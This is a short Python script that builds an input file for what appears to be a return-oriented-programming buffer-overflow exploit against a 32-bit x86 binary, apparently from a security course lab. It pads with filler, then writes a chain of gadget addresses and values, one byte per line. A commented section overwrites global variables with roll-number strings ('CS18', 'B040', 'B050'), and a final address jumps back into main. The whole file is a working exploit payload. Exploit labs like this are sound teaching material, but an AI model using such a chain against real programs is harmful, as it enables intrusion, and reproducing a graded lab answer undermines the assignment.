with open('in', 'wb') as f:
	f.write( b'A'*14 + b'\n')
	f.write(b'A\n'*1175 +
	       	b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x05\n\x00\n\x00\n\x00\n' +
	        b'\xb6\n\x72\n\x06\n\x08\n' +
	        b'\x1e\n\xc7\n\x06\n\x08\n' +
	        b'A\n'*44 +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x04\n\x00\n\x00\n\x00\n' +
	        b'\x1e\n\xc7\n\x06\n\x08\n' +
	        b'A\n'*44 +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x03\n\x00\n\x00\n\x00\n' +
	        b'\x1e\n\xc7\n\x06\n\x08\n' +
	        b'A\n'*44 +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x02\n\x00\n\x00\n\x00\n' +
	        b'\x1e\n\xc7\n\x06\n\x08\n' +
	        b'A\n'*44 +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x20\n\xba\n\x0e\n\x08\n' +
	        b'\xb4\n\x72\n\x06\n\x08\n' +
	#	b'\xca\n\x83\n\x04\n\x08\n' +
	#	b'\x58\n\xd4\n\xff\n\xff\n' +
	#	b'\x9d\n\x89\n\x04\n\x08\n' +
	# roll number part (overwriting the global variables)
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x68\n\xa0\n\x0e\n\x08\n' +
	        b'\x76\n\x83\n\x0b\n\x08\n' +
		b'\x43\n\x53\n\x31\n\x38\n' +
	        b'\xb4\n\x72\n\x06\n\x08\n' +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x6c\n\xa0\n\x0e\n\x08\n' +
	        b'\x76\n\x83\n\x0b\n\x08\n' +
		b'\x42\n\x30\n\x34\n\x30\n' +
	        b'\xb4\n\x72\n\x06\n\x08\n' +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x78\n\xa0\n\x0e\n\x08\n' +
	        b'\x76\n\x83\n\x0b\n\x08\n' +
		b'\x43\n\x53\n\x31\n\x38\n' +
	        b'\xb4\n\x72\n\x06\n\x08\n' +
	        b'\x42\n\xbf\n\x05\n\x08\n' +
	        b'\x7c\n\xa0\n\x0e\n\x08\n' +
	        b'\x76\n\x83\n\x0b\n\x08\n' +
		b'\x42\n\x30\n\x35\n\x30\n' +
	        b'\xb4\n\x72\n\x06\n\x08\n' +
	# address to jump to in main
		b'\x83\n\x89\n\x04\n\x08\n' +
		b'A'*12 + b'\x09\x00\x00'
	)
		
